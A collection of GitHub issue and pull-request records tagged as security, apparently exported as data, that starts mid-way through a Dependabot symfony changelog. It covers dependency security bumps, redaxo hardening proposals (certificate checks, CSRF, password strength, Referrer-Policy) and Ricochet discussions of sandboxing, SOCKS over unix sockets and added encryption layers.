>  * bug [#31076](https://github-redirect.dependabot.com/symfony/symfony/issues/31076) [HttpKernel] Fixed LoggerDataCollector crashing on empty file (althaus)
>  * bug [#31071](https://github-redirect.dependabot.com/symfony/symfony/issues/31071) property normalizer should also pass format and context to isAllowedAttribute (dbu)
>  * bug [#31059](https://github-redirect.dependabot.com/symfony/symfony/issues/31059) Show more accurate message in profiler when missing stopwatch (linaori)
>  * bug [#30423](https://github-redirect.dependabot.com/symfony/symfony/issues/30423) [Security] Rework firewall's access denied rule (dimabory)
>  * bug [#31012](https://github-redirect.dependabot.com/symfony/symfony/issues/31012) [Process] Fix missing $extraDirs when open_basedir returns (arsonik)
>  * bug [#30907](https://github-redirect.dependabot.com/symfony/symfony/issues/30907) [Serializer] Respect ignored attributes in cache key of normalizer (dbu)
>  * bug [#30085](https://github-redirect.dependabot.com/symfony/symfony/issues/30085) Fix TestRunner compatibility to PhpUnit 8 (alexander-schranz)
>  * bug [#30977](https://github-redirect.dependabot.com/symfony/symfony/issues/30977) [serializer] prevent mixup in normalizer of the object to populate (dbu)
>  * bug [#30976](https://github-redirect.dependabot.com/symfony/symfony/issues/30976) [Debug] Fixed error handling when an error is already handled when another error is already handled (5) (lyrixx)
>  * bug [#30979](https://github-redirect.dependabot.com/symfony/symfony/issues/30979) Fix the configurability of CoreExtension deps in standalone usage (stof)
>  * bug [#30918](https://github-redirect.dependabot.com/symfony/symfony/issues/30918) [Cache] fix using ProxyAdapter inside TagAwareAdapter (dmaicher)
>  * bug [#30961](https://github-redirect.dependabot.com/symfony/symfony/issues/30961) [Form] fix translating file validation error message (xabbuh)
>  * bug [#30951](https://github-redirect.dependabot.com/symfony/symfony/issues/30951) Handle case where no translations were found (greg0ire)
>  * bug [#29800](https://github-redirect.dependabot.com/symfony/symfony/issues/29800) [Validator] Only traverse arrays that are cascaded into (corphi)
>  * bug [#30921](https://github-redirect.dependabot.com/symfony/symfony/issues/30921) [Translator] Warm up the translations cache in dev (tgalopin)
>  * bug [#30922](https://github-redirect.dependabot.com/symfony/symfony/issues/30922) [TwigBridge] fix horizontal spacing of inlined Bootstrap forms (xabbuh)
>  * bug [#30895](https://github-redirect.dependabot.com/symfony/symfony/issues/30895) [Form] turn failed file uploads into form errors (xabbuh)
>  * bug [#30919](https://github-redirect.dependabot.com/symfony/symfony/issues/30919) [Translator] Fix wrong dump for PO files (deguif)
>  * bug [#30889](https://github-redirect.dependabot.com/symfony/symfony/issues/30889) [DependencyInjection] Fix a wrong error when using a factory (Simperfit)
>  * bug [#30879](https://github-redirect.dependabot.com/symfony/symfony/issues/30879) [Form] Php doc fixes and cs + optimizations (Jules Pietri)
>  * bug [#30883](https://github-redirect.dependabot.com/symfony/symfony/issues/30883) [Console] Fix stty not reset when aborting in QuestionHelper::autocomplete() (Simperfit)
>  * bug [#30878](https://github-redirect.dependabot.com/symfony/symfony/issues/30878) [Console] Fix inconsistent result for choice questions in non-interactive mode (chalasr)
> 
> * 3.4.24 (2019-04-02)
> 
>  * bug [#30660](https://github-redirect.dependabot.com/symfony/symfony/issues/30660) [Bridge][Twig] DebugCommand - fix escaping and filter (SpacePossum)
>  * bug [#30720](https://github-redirect.dependabot.com/symfony/symfony/issues/30720) Fix getSetMethodNormalizer to correctly ignore the attributes specified in ""ignored_attributes"" (Emmanuel BORGES)
>  * bug [#30749](https://github-redirect.dependabot.com/symfony/symfony/issues/30749) [Serializer] Added check of constuctor modifiers to AbstractNormalizer (NekaKawaii)
>  * bug [#30776](https://github-redirect.dependabot.com/symfony/symfony/issues/30776) [Routing] Fix routes annotation loading with glob pattern (snoob)
>  * bug [#30773](https://github-redirect.dependabot.com/symfony/symfony/issues/30773) [DependencyInjection] Fix hardcoded hotPathTagName (jderusse)
>  * bug [#30737](https://github-redirect.dependabot.com/symfony/symfony/issues/30737) [Validator] Improve constraint default option check (vudaltsov)
>  * bug [#30736](https://github-redirect.dependabot.com/symfony/symfony/issues/30736) [Validator] Fix annotation default for [@&#8203;Count](https://github.com/Count) and [@&#8203;Length](https://github.com/Length) (vudaltsov)
>  * bug [#30620](https://github-redirect.dependabot.com/symfony/symfony/issues/30620) [FrameworkBundle][HttpFoundation] make session service resettable (dmaicher)
>  * bug [#30640](https://github-redirect.dependabot.com/symfony/symfony/issues/30640) [Phpunit] fixed support for PHP 5.3 (fabpot)
>  * bug [#30595](https://github-redirect.dependabot.com/symfony/symfony/issues/30595) Do not validate child constraints if form has no validation groups (maryo)
>  * bug [#30479](https://github-redirect.dependabot.com/symfony/symfony/issues/30479) Check if Client exists when test.client does not exist, to provide clearer exception message (SerkanYildiz)
>  * feature [#30584](https://github-redirect.dependabot.com/symfony/symfony/issues/30584) [Intl] Add compile binary (ro0NL)
></tr></table> ... (truncated)
</details>
<details>
<summary>Commits</summary>

- [`1b89e7b`](https://github.com/symfony/symfony/commit/1b89e7baec9891c323bbf1ec81af77d901fc60c9) Merge pull request [#31146](https://github-redirect.dependabot.com/symfony/symfony/issues/31146) from fabpot/release-3.4.26
- [`ef3b684`](https://github.com/symfony/symfony/commit/ef3b684208f3450eb2cae8381ccbbd6c7ee5603e) updated VERSION for 3.4.26
- [`35741bd`](https://github.com/symfony/symfony/commit/35741bd475a7e24d4018c02a2840911d496719af) updated CHANGELOG for 3.4.26
- [`82f003e`](https://github.com/symfony/symfony/commit/82f003eaf35fa86fab216fcc71b1ea1dd0bd2a15) minor [#31132](https://github-redirect.dependabot.com/symfony/symfony/issues/31132) [VarDumper][Ldap] relax some locally failing tests (nicolas-grekas)
- [`f458e5b`](https://github.com/symfony/symfony/commit/f458e5b85a65343883a728406093d18405a54aea) minor [#31128](https://github-redirect.dependabot.com/symfony/symfony/issues/31128) [Validator] Added the missing translations for the Tagalog (""tl""...
- [`1311324`](https://github.com/symfony/symfony/commit/13113245bf0cc8dfe17518ab9de89bea6675911b) bug [#31084](https://github-redirect.dependabot.com/symfony/symfony/issues/31084) [HttpFoundation] Make MimeTypeExtensionGuesser case insensitive (v...
- [`55a21fb`](https://github.com/symfony/symfony/commit/55a21fb08f2cdf1668bd31886406210bb035809e) bug [#31142](https://github-redirect.dependabot.com/symfony/symfony/issues/31142) Revert ""bug [#30423](https://github-redirect.dependabot.com/symfony/symfony/issues/30423) [Security] Rework firewall's access denied rule...
- [`70166f0`](https://github.com/symfony/symfony/commit/70166f03ebd637c9d6bd7c4de2be444b9fa7bf5b) Merge remote-tracking branch 'origin/3.4' into 3.4
- [`a288a74`](https://github.com/symfony/symfony/commit/a288a74d7479ab7227855e1af584bd0191d71b80) minor [#31137](https://github-redirect.dependabot.com/symfony/symfony/issues/31137) [FrameworkBundle] minor: remove a typo from changelog (Simperfit)
- [`cd77f6f`](https://github.com/symfony/symfony/commit/cd77f6f91c4e0fe733bae4bd8014ee81b06d7871) Revert ""bug [#30423](https://github-redirect.dependabot.com/symfony/symfony/issues/30423) [Security] Rework firewall's access denied rule (dimabory)""
- Additional commits viewable in [compare view](https://github.com/symfony/symfony/compare/v3.4.23...v3.4.26)
</details>
<br />

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=symfony/symfony&package-manager=composer&previous-version=3.4.23&new-version=3.4.26)](https://dependabot.com/compatibility-score.html?dependency-name=symfony/symfony&package-manager=composer&previous-version=3.4.23&new-version=3.4.26)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot ignore this [patch|minor|major] version` will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)

Finally, you can contact us by mentioning @dependabot.

</details>",,yes,"dependencies,security,"
miholeus/symphonia,449638299,"⬆️ 🔒 Bump symfony/phpunit-bridge from 4.1.1 to 4.1.12","Bumps [symfony/phpunit-bridge](https://github.com/symfony/phpunit-bridge) from 4.1.1 to 4.1.12. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/phpunit-bridge/CVE-2019-10912.yaml).*

> **CVE-2019-10912: Prevent destructors with side-effects from being unserialized**
> 
> Affected versions: >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

</details>
<details>
<summary>Commits</summary>

- [`cc546f5`](https://github.com/symfony/phpunit-bridge/commit/cc546f59d55f63010ff4d4f40a2af39526842524) security #cve-2019-10912 [Cache][PHPUnit Bridge] Prevent destructors with sid...
- [`cb5e1b8`](https://github.com/symfony/phpunit-bridge/commit/cb5e1b8960407cbbfa30c4aecdcdfb0486c22ada) Merge branch '3.4' into 4.1
- [`60080cd`](https://github.com/symfony/phpunit-bridge/commit/60080cd9a5e6209339becb01f32671a9f5f1c09a) [appveyor] fix create-project phpunit
- [`1d98514`](https://github.com/symfony/phpunit-bridge/commit/1d985148d957fd5a30767c666defb6841e95db9a) Merge branch '3.4' into 4.1
- [`d61ec43`](https://github.com/symfony/phpunit-bridge/commit/d61ec438634e0f234c6bda1c6ee97016bbb0e7a1) fixed short array CS in comments
- [`c99a6b4`](https://github.com/symfony/phpunit-bridge/commit/c99a6b42d7a351e3c992db4939fb97f231e97b76) fixed CS in generated files
- [`23c29c4`](https://github.com/symfony/phpunit-bridge/commit/23c29c4a4eeaf4a0b81fc6cc50915f7ea1d065c3) switched array() to []
- [`078f948`](https://github.com/symfony/phpunit-bridge/commit/078f9482e0ebc320099517ccc23e147178e6b6d4) Merge branch '3.4' into 4.1
- [`5dab0d4`](https://github.com/symfony/phpunit-bridge/commit/5dab0d4b2ac99ab22b447b615fdfdc10ec4af3d5) update year in license files
- [`473fb45`](https://github.com/symfony/phpunit-bridge/commit/473fb4544afff836f4d9877c4607efe46b94cea9) Merge branch '3.4' into 4.1
- Additional commits viewable in [compare view](https://github.com/symfony/phpunit-bridge/compare/v4.1.1...v4.1.12)
</details>
<br />

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=symfony/phpunit-bridge&package-manager=composer&previous-version=4.1.1&new-version=4.1.12)](https://dependabot.com/compatibility-score.html?dependency-name=symfony/phpunit-bridge&package-manager=composer&previous-version=4.1.1&new-version=4.1.12)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot ignore this [patch|minor|major] version` will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)

Finally, you can contact us by mentioning @dependabot.

</details>

[//]: # (dependabot-acquisition-announcement-start)

---

<a href='https://dependabot.com/blog/hello-github/'><img width='376' alt='Dependabot has been acquired by GitHub  🎉' src='https://user-images.githubusercontent.com/20165/58035530-e739b700-7b20-11e9-9d1b-12a7630b84e0.png'></a>

[//]: # (dependabot-acquisition-announcement-end)",,yes,"dependencies,security,"
FileZ/FileZ,9469877,"Brute Force","Is there any kind of anti brute force system in place on the login page or on password protected files?
","Not yet, it's on the rock.
",no,"security,"
renyard/validity,92500159,"Extension needs privacy policy","Since the extension uses both an external validation server (where user data is sent to be validated) and Google Analytics, it should also include a privacy policy in order to properly inform users about how their data is being used.

FYI, both the [Google Chrome Web Store Terms of Service](https://developers.google.com/chrome/web-store/terms) and the [Google Analytics Terms of Service](http://www.google.com/analytics/terms/us.html) require a privacy policy.
","Thanks for bringing this up. Sounds like a good idea regardless of the terms of service, as I'd like to be as open as possible about data collection.

It largely boils down to not collecting or storing (in the case of source code which has to go to the validator) anything that's got any possibility of containing personal information. Google Analytics currently only counts launches, but I may look to include other usage data in the future, with the mentioned caveats. I think a more official policy is needed before going down that road, though.
",no,"security,"
redaxo/redaxo,1006226973,"Installer: redaxo.org zeritifikat verifizieren","**Feature description / Feature Beschreibung**
wir sollten das redaxo.org public zert im installer validieren, damit man sicherstellen kann dass updates via installer immer von redaxo.org bedient werden",,no,"Security,Installer,"
redaxo/redaxo,204545735,"https defaults","sollten folgende klassen per default https:// verwenden statt http:// ?
- rex_socket
- rex_socket_proxy
- rex_cronjob_urlrequest

?","Wäre das nicht ein BC-Break?Ja wäre es",no,"Enhancement,Security,Backwards Incompatible,"
redaxo/redaxo,884150753,"integrate with HaveIBeenPawnd","**Feature description / Feature Beschreibung**
beim vergeben von passwörtern an einen neuen user, ändern eines passwortes (von sich selbst, oder einem anderen user) oder bei login, soll geprüft werden ob das verwendete passwort in einem [haveibeenpwned ](https://haveibeenpwned.com/) data breach enthalten war

library für die api https://packagist.org/?query=haveibeenpwned

~~[die api](https://haveibeenpwned.com/API/Key) kostet 3,5€ pro monat, daher sollten wir den mechanismus anbieten aber der redaxo admin muss sich selbst einen key besorgen und diesen hinterlegen~~","Meint ihr das würden manche nutzen für die Backend-Benutzer? Ich weiß es nicht, vermute aber eher nicht.Ich finde das grundsätzlich gut. Das schärft evtl beim User-Anlegen oder beim eigenen Passwort evtl. das Bewusstsein dafür, nicht überall die gleichen Zugangsdaten zu verwenden, wenn man es sieht.

Bezahl-API ist evtl nice to have. Evtl reicht aber schon ein irgendwie gearteter Hinweis „Basic-Sixherheits-Richtlinien beachten. Hier kannst du überprüfen, ob deine Usename/Passwort-Kombination schon mal gehackt wurde“ oder so. Und dann ein Link auf https://haveibeenpwned.com/
Optional mit API-Möglichkeit.
My two cents. ",no,"Security,"
redaxo/redaxo,373898402,"Sha1 pre-hashing entfernen","Sha1 pre-hashing wurde ursrp. eingebaut als
- sha1 noch als sicher galt
- produktive systeme ggf. Nicht via https gearbeitet haben

Heute:
- es ist bekannt das sha1 keinen schutz bietet
- es ist bekannt das produktivsysteme ohne https ein No-Go sind

-> sha1 pre hashing entfernen, sowohl im js als auch auf php seite","War das Prehashing nicht auch aus Kompatibilitätsgründen drin, damit Passwörter-Hashs in der Datenbank nicht neu gesetzt werden müssen?Nein. ",no,"Security,Core,Backwards Incompatible,"
redaxo/redaxo,1006981281,"Class file signaturen verwenden","**Feature description / Feature Beschreibung**
Mittels https://github.com/Roave/Signature Könnte man klassen-signaturen erzeugen und diese im redaxo setup prüfen. Somit könnte man sicherstellen dass dateien nicht falsch uploaded wurden oder andere einflüsse diese verändert haben.

Man könnte auch im sysreport ermöglichen dass ein admin den check anstößt ohne das setup duechlaufen zu müssen

Es geht hierbei nicht um cryptografische sicherheit aber einen einfachen weg die Integrität der sourcen sicherzustellen.",,no,"Security,Setup,"
redaxo/redaxo,374795557,"Stärkere csrf tokens","**Feature description / Feature Beschreibung**
https://github.com/paragonie/anti-csrf","Hier ein explainer bzgl csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",no,"Enhancement,Security,Core,"
redaxo/redaxo,440764456,"'Referrer Policy' im Backend verwenden","**Feature description / Feature Beschreibung**
Wenn man sich im Backend bewegt sollten skripte/urls die externe Domains aufrufen keine Referer-Informationen erhalten um das Backend möglichst unsichtbar zu machen und die Privatsphäre der Benutzer zu wahren.

https://scotthelme.co.uk/a-new-security-header-referrer-policy/
https://caniuse.com/#search=referrer%20policy
https://infosec.mozilla.org/guidelines/web_security#referrer-policy

Ich denke wir sollten mit `no-referer` arbeiten und die verfügbaren optionen via `config.yml` einstellbar machen (analog samesite-cookie headers o.ä.).

Dies sollte nur im Backend passieren. Im Frontend kann/muss der Admin selbst für eine sinnvolle policy sorgen.","no-referer führt doch bei SameSite:strict zum Abbruch, oder ? Ist das nicht die Info mit der SameSite arbeitet ?> no-referer führt doch bei SameSite:strict zum Abbruch, oder ? Ist das nicht die Info mit der SameSite arbeitet ?

mir ist kein problem dahingehend bekannt, habe mich aber auch noch nicht damit beschäftigt.

meine vermutung: ich denke das ""no-referer"" dazu führt dass der browser keine referer information an 3rd parties weitergibt. diese information kommt also nicht bei 3rd parties an.
der browser selbst kennt sie ja dennoch.

Samesite strict bezieht sich auf cookies und die entscheidung dafür findet im browser statt.
daher vermute ich dass es hier kein zusammenspiel der 2 einstellungen gibt.

falls dir ein konkretes szenario/beispiel bekannt ist gerne aber nennen (ich kann mich durchaus irren)",no,"Enhancement,Security,Core,User Experience (UX),"
redaxo/redaxo,796971007,"bessere password-strength regeln","**Feature description / Feature Beschreibung**
die bestehenden passwort rules die wir verwenden, sorgen nicht wirklich für sichere passworte.
Im detail ist das hier beschrieben https://dropbox.tech/security/zxcvbn-realistic-password-strength-estimation

wir sollten überlegen ob wir stattdessen (oder zusätzlich, wg. BC) mit einer library arbeiten sollten, die die stärke eines passworts bewertet, z.B. https://github.com/bjeavons/zxcvbn-php",,no,"Security,Developer Experience (DX),User Experience (UX),"
ricochet-im/ricochet,97234115,"Sandboxing","I've been experimenting with sandboxing Ricochet - I've contained it within an AppArmor profile when installed systemwide and confirm that it runs inside of xpra for X11 sandboxing. The xpra sandboxing causes some display issues with text labels on QT menu items. I think this must be a QT/xpra issue. None the less - this means that Ricochet is much more contained than when I started.

The main concern that I have is that Ricochet is much harder to sandbox than it should be - pulseaudio access means that it can potentially use that access to listen to the microphone when we only want to do notification of messaging. The fact that it runs Tor rather than connecting to a control port that can be filtered with a control port filter is much the same. Furthermore, I really think it would be good if Ricochet used the UnixSocket SOCKS5 code rather than using TCP/IP to talk to that Tor - regardless of Ricochet launching Tor or using a system Tor.

My future goals including running Ricochet inside of minijail ( ​https://chromium.googlesource.com/chromiumos/platform/minijail/ ) and generally approaching sandboxing as I describe in the Tor Messenger ticket on sandboxing ( https://trac.torproject.org/projects/tor/ticket/10943 ).

To make all of this easy to use - I've written an AppArmor policy file (to be installed manually or at `make install` time) and a very simple shell script that wraps Ricochet in xpra and could be expanded to cover OSX seatbelt sandboxing, etc.
","> when installed systemwide and confirm that it runs inside of xpra for X11 sandboxing. The xpra sandboxing causes some display issues with text labels on QT menu items.

There have been various issues with how Qt renders text, especially on Linux. The situation is improving in newer versions of Qt5. For what it's worth, I can run it under xpra on Fedora 21 with no trouble.

> The main concern that I have is that Ricochet is much harder to sandbox than it should be - pulseaudio access means that it can potentially use that access to listen to the microphone when we only want to do notification of messaging

Wow, sounds like pulseaudio needs better policy support. Ricochet should function perfectly fine without it (minus the audio notifications). We should make sure Ricochet won't even connect to pulse unless those are enabled (#226).

> The fact that it runs Tor rather than connecting to a control port that can be filtered with a control port filter is much the same.

This theoretically works, but there's no UI exposed to configure it, and no documentation on how. In practice, it usually fails because of the hidden service directory ownership. ADD_ONION support will help here.

> Furthermore, I really think it would be good if Ricochet used the UnixSocket SOCKS5 code rather than using TCP/IP to talk to that Tor - regardless of Ricochet launching Tor or using a system Tor.

#224, #225

> To make all of this easy to use - I've written an AppArmor policy file (to be installed manually or at make install time) and a very simple shell script that wraps Ricochet in xpra and could be expanded to cover OSX seatbelt sandboxing, etc.

Great! Please submit a pull request for that. We can put these in a `contrib/` sort of directory for now, and include apparmor in a .deb once there is one.
I spent some time today working on sandboxing Ricochet with minijail. It was absurdly hilariously annoying. I opened #232 to contribute some basic minijail policies. I've also included an AppArmor profile and an example of using `xpra` to sandbox Ricochet.
For Windows, see https://github.com/MalwareTech/AppContainerSandbox
",no,"enhancement,security,"
ricochet-im/ricochet,97253067,"Implement safer SOCKS support, and allow access over unix sockets","Ricochet should use and prefer unix sockets to access tor's socks port, when tor and the system support this.

This will likely require using a different socks implementation from Qt's, but that's probably a good idea anyway. That one seems a little fragile.
","Adding security, on the basis that I'd prefer to never rely on Qt to treat .onion addresses correctly (and not do DNS lookups). As of now I don't know of any situation where that happens, but it's too fragile.
Implemented in my unix-socks-port branch:
- Refactored TorSocket with its own SOCKS4a implementation instead of using Qt proxies
- Handle unix: SocksPorts from Tor, and prefer them if we're using a unix control port
- For bundled Tor, try to configure a unix socks port by default

That branch also includes control port (#224) and service unix sockets, as well as the new AbstractSocket wrapper to allow Connection to handle unix sockets.

It has a few remaining issues:
- Tor can't handle socket paths containing spaces

See https://trac.torproject.org/projects/tor/ticket/18753. This blocks us from using unix sockets in bundled tor. As a workaround, we could use system paths instead when the configuration path contains spaces, except that:
- Tor requires the control port socket to be in a directory only readable by the user

This prevents us from configuring a control port socket in a system directory, which we'd only want to do to work around the above issue. To work around this one, we'd have to create a new directory for our sockets. Newer tor has a RelaxDirModeCheck option, but we can't rely on having that version.
- Service socket ownership and permissions

The correct behavior for ownership and permissions on sockets we create for our services aren't clear. For bundled tor, we should limit to the current user only. Otherwise, we need something readable by ricochet's user and the tor user. On debian, we could try to use group-readable and change the group to debian-tor. It might make more sense to use world-readable sockets and rely on other mechanisms for access control.
- Parsing ipv6 socks ports and SETCONF with unix socket services haven't been tested

These just need to be exercised a bit to see if they actually work.
> Tor can't handle socket paths containing spaces
> 
> See https://trac.torproject.org/projects/tor/ticket/18753. This blocks us from using unix sockets in bundled tor. As a workaround, we could use system paths instead when the configuration path contains spaces, except that:

This is fixed upstream for 0.2.9 by allowing quoted strings for unix socket paths, but not in any stable release yet.
",no,"enhancement,security,"
ricochet-im/ricochet,340078539,"[Proposal] New Client Authentication Protocol","Today I had a conversation with someone regarding deniability and the way ricochet currently does client authentication in the protocol. 

They proposed we replace our current challenge-response protocol (https://github.com/ricochet-im/ricochet/blob/master/doc/protocol.md#authhiddenservice) with a 3DH DAKE - we would then encrypt messages between peers using the derived key. 

This would provide client authentication as well as offline deniability (not online deniability), and Tor would not break the deniability. An improvement over the current challenge-response protocol, and it would also give us protocol level encryption.

There have been discussions about this before e.g. #72 which tailored off with talk of axolotl and otr. I think there are still open questions about multi-party encryption and the like, but I don't think improving the standard two party authentication harms any future extensions.

Way back then @special outlined 3 considerations which I think are still good:

>     1) Any additional cryptography provides a clear benefit over what we have now
>     2) Applies to arbitrary protocol data, not just chat messages; e.g. file transfers
>     3) Implementation doesn't add an unmanageable security/exploitation risk

I think 3DH meets those 3 points.

In any case, OP will be implementing this (most likely as `im.ricochet.auth.3dh-dake`) in libricochet-go as we believe it provides a notable improvement to the current state. I think this would be a solid improvement to add this to the spec/application too.


",,no,"enhancement,idea,security,"
ricochet-im/ricochet,39353718,"Layer stronger cryptography on top of hidden services","As an extra layer of security, I would find it very useful to have the option of using public-key encryption with perfect forward security in Ricochet.
","The hidden service connection is already decently encrypted, authenticated by public key (RSA 1024, with the public key authenticated by 80 bits of SHA1), and forward-secret at the connection level (DH during rendezvous).

I think it is a good idea to add another layer of cryptography beyond what hidden service connections provide, especially if it allows us to provide stronger key and forward secrecy guarantees. I'm also interested in separating ""identity"" keys from ""transport"" keys (hidden services).

The details get more complicated. My requirements for considering options are:
- Any additional cryptography provides a clear benefit over what we have now
- Applies to arbitrary protocol data, not just chat messages; e.g. file transfers
- Implementation doesn't add an unmanageable security/exploitation risk

For example, OTR is intended to secure message content, not an entire protocol. Deniability is not a useful trait here. It would be reasonable easy to implement, and is generally trusted, but I don't see much clear benefit in having it. Out-of-the-box OTR would be hacked on top of the protocol, rather than being part of it.

This task needs a good survey of what we stand to gain and how existing options in the field could be used. The situation is different from most IM software, because we have ""direct"" peer-to-peer communication and decent cryptography at the transport layer.
Relevant reading: https://github.com/WhisperSystems/TextSecure/wiki/ProtocolV2
more relevant reading:
https://pond.imperialviolet.org/
https://pond.imperialviolet.org/threat.html
https://pond.imperialviolet.org/tech.html
https://github.com/WhisperSystems/libaxolotl-java

;)
hi!

stumbled upon your considerations, you might find this project useful: https://github.com/cossacklabs/themis

we've designed secure messaging scheme (called Secure Session) with PFS and some other strong features exactly for securing chats / session-based rpc (the latter was our main subject of interest, but security model equally works for the former). we already have accumulated some knowledge in helping other people building secure human communications with it, so apart from code we'd be glad to share knowledge :)

it's free and open-source and if you find the model interesting, ping me or any of the project contributors and we might find the way to make your life easier. 

and, btw, we have c++ wrapper in the works, too (we're doing PNaCl port of the library now).
Axolotl is the best choice here as it's vastly stronger than afaik all other forward secrecy approaches.  Axolotl even becomes post-quantum if the adversary ever misses even a pair of message in a round trip, say due to Tor protecting their route.

It's fun to implement yourself, but if you want another library for it, as mistakes are easy to make, then I'm sure you'll find some C++ ones : https://github.com/CODeRUS/libaxolotl 
If you are aiming for multi device usage in the future, OMEMO might be an even better choice:
http://conversations.im/omemo/
Also backwards compatibility to OTR should remain. So when communicating, the client should first try establishing a Axolotl/OMEMO session, if it fails, fall back to OTR, kinda like it's done with SSL, where Browser and Server try to agree on a common cipher
I don't think it's a very good idea to optionally fall back to weaker/older crypto. It's not like there will be clients that somehow support OTR but not axolotl if the spec says axolotl, and supporting weaker schemes is just asking for downgrade attacks. SSL is an excellent example of why things should NOT be done this way.
Here is a resource https://www.eff.org/secure-messaging-scorecard to find well vetted, open-source messengers which you might want to pull protocols from. Signal (Open Whisper Systems mentioned above) is well rated.
I think the next release of OtR will address it's current shortfalls relative to Axolotl, mostly by incorporating Axolotl, while keeping some non-Axolotl features the designers like, and replacing the key exchange with something fancier than TripleDH.  

Ricochet does not do multiple devices per se, but as that came up.  OtR will continue to handle multiple devices well, but probably not with the same model at OMEMO.  OMEMO shares all your messages with all your devices, a nice convenience, but also an MitM attack vector.  The next OtR should target the ""most-recent most-trusted device"".

I do not know when this will happen, nor even if the initial reference implementation will still be in C.  I gather the current libotr is not necessarily a good guide for the API, and that support for OtR v2 will be dropped.  

If nothing happens here for long enough, then this probably become a good option.  It's certainly heavier than just rolling in an Axolotl ratchet, but it still might offer some advantages.
some notes by @tqbf: https://news.ycombinator.com/item?id=11432819
Interesting reading: http://www.noiseprotocol.org/

Particularly some good points to think about in http://www.noiseprotocol.org/noise.html#payload-security-properties and http://www.noiseprotocol.org/noise.html#identity-hiding
> TFC uses XChaCha20-Poly1305 end-to-end encryption with deniable authentication. The symmetric keys are either pre-shared, or exchanged using X448, the base-10 fingerprints of which are verified via out-of-band channel. TFC provides per-message forward secrecy with BLAKE2b based hash ratchet. All persistent user data is encrypted locally using XChaCha20-Poly1305, the key of which is derived from password and salt using Argon2d. Key generation of TFC relies on Linux kernel's getrandom(), a syscall for its ChaCha20 based CSPRNG.

https://github.com/maqp/tfc

This sounds pretty good to me, or perhaps ed25519 for key exchange and signature to provide authenticity and integrity, with xsalsa20 for stream cipher to provide confidentiality.

For the record, you can use BLAKE2 as a prefix-MAC instead of HMAC.

https://blake2.net/blake2.pdf

Additionally, I have not checked the code but I sure hope it does an explicit_bzero() consistently immediately after the confidential data is no longer needed. Keep mlock() in mind as well to avoid swapping it to disk. We may need assembly to zero relevant CPU registers (but highly unlikely).",no,"idea,security,"
ricochet-im/ricochet,125291833,"Reproducible builds?","Are there plans to provide instructions to verify that the binary downloads on the website correspond with the source code for that release?
","Hm, I thought there was a task for this already. Now there's this one - thanks :)

This is important, but it's going to need some significant work to get working reproducible builds across platforms. It's a tricky problem.
...now that ricochet is in debian isn't that happening (at least in debian land)? https://tests.reproducible-builds.org/debian/rb-pkg/unstable/amd64/ricochet-im.html",no,"enhancement,packaging,security,"
ricochet-im/ricochet,97235066,"seccomp support","It would be nice if we had a defined set of things needed and deny the rest using seccomp on GNU/Linux platforms. It seems possible to do this with minijail - this doesn't strike me as the best manner in which to sandbox things though. That is usually just a stepping stone rather than adding the seccomp filter code to the application directly.

What syscalls does Ricochet absolutely need? If this was defined, I think it would be extremely useful.
